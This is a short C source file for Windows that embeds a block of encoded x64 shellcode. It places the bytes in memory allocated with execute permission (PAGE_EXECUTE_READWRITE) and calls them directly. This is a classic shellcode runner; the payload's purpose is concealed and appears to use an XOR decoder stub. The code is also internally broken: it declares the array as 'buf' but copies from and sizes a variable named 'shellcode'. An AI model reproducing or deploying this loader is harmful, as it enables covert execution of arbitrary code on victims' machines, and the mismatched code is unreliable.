#include "stdafx.h"
#include "Windows.h"

int main()
{
	unsigned char buf[] = 
	"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
	"\xff\xff\xff\x48\xbb\x74\x59\x65\x98\xc7\x65\x8c\xfa\x48"
	"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x88\x11\xe6"
	"\x7c\x37\x8d\x4c\xfa\x74\x59\x24\xc9\x86\x35\xde\xab\x22"
	"\x11\x54\x4a\xa2\x2d\x07\xa8\x14\x11\xee\xca\xdf\x2d\x07"
	"\xa8\x54\x11\xee\xea\x97\x2d\x83\x4d\x3e\x13\x28\xa9\x0e"
	"\x2d\xbd\x3a\xd8\x65\x04\xe4\xc5\x49\xac\xbb\xb5\x90\x68"
	"\xd9\xc6\xa4\x6e\x17\x26\x18\x34\xd0\x4c\x37\xac\x71\x36"
	"\x65\x2d\x99\x17\xee\x0c\x72\x74\x59\x65\xd0\x42\xa5\xf8"
	"\x9d\x3c\x58\xb5\xc8\x4c\x2d\x94\xbe\xff\x19\x45\xd1\xc6"
	"\xb5\x6f\xac\x3c\xa6\xac\xd9\x4c\x51\x04\xb2\x75\x8f\x28"
	"\xa9\x0e\x2d\xbd\x3a\xd8\x18\xa4\x51\xca\x24\x8d\x3b\x4c"
	"\xb9\x10\x69\x8b\x66\xc0\xde\x7c\x1c\x5c\x49\xb2\xbd\xd4"
	"\xbe\xff\x19\x41\xd1\xc6\xb5\xea\xbb\xff\x55\x2d\xdc\x4c"
	"\x25\x90\xb3\x75\x89\x24\x13\xc3\xed\xc4\xfb\xa4\x18\x3d"
	"\xd9\x9f\x3b\xd5\xa0\x35\x01\x24\xc1\x86\x3f\xc4\x79\x98"
	"\x79\x24\xca\x38\x85\xd4\xbb\x2d\x03\x2d\x13\xd5\x8c\xdb"
	"\x05\x8b\xa6\x38\xd1\x79\x12\xff\xc8\x2b\x6a\x57\x98\xc7"
	"\x24\xda\xb3\xfd\xbf\x2d\x19\x2b\xc5\x8d\xfa\x74\x10\xec"
	"\x7d\x8e\xd9\x8e\xfa\x65\x05\xa5\x30\xff\xe9\xcd\xae\x3d"
	"\xd0\x81\xd4\x4e\x94\xcd\x40\x38\x2e\x43\x9f\x38\xb0\xc0"
	"\x73\x9e\x31\x64\x99\xc7\x65\xd5\xbb\xce\x70\xe5\xf3\xc7"
	"\x9a\x59\xaa\x24\x14\x54\x51\x8a\x54\x4c\xb2\x8b\x99\x2d"
	"\x11\x05\x2d\x73\x3a\x3c\xd0\xa4\xd9\x7d\x8f\x83\x25\x94"
	"\xa6\xb0\xd0\x4e\xa2\xe6\xea\x35\x01\x29\x11\x25\x2d\x05"
	"\x03\x35\xe3\xfc\x3d\xb3\x04\x73\x2f\x3c\xd8\xa1\xd8\xc5"
	"\x65\x8c\xb3\xcc\x3a\x08\xfc\xc7\x65\x8c\xfa\x74\x18\x35"
	"\xd9\x97\x2d\x05\x18\x23\x0e\x32\xd5\xf6\xa5\xe6\xf7\x2d"
	"\x18\x35\x7a\x3b\x03\x4b\xbe\x50\x0d\x64\x99\x8f\xe8\xc8"
	"\xde\x6c\x9f\x65\xf0\x8f\xec\x6a\xac\x24\x18\x35\xd9\x97"
	"\x24\xdc\xb3\x8b\x99\x24\xc8\x8e\x9a\x44\xb7\xfd\x98\x29"
	"\x11\x06\x24\x36\x83\xb8\x66\xe3\x67\x12\x2d\xbd\x28\x3c"
	"\xa6\xaf\x13\xc9\x24\x36\xf2\xf3\x44\x05\x67\x12\xde\x7c"
	"\x4f\xd6\x0f\x24\x22\x61\xf0\x31\x67\x8b\x8c\x2d\x1b\x03"
	"\x4d\xb0\xfc\x08\x53\xe5\x63\x27\x10\x89\x41\x33\x4a\x17"
	"\xf7\xad\x65\xd5\xbb\xfd\x83\x9a\x4d\xc7\x65\x8c\xfa";

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}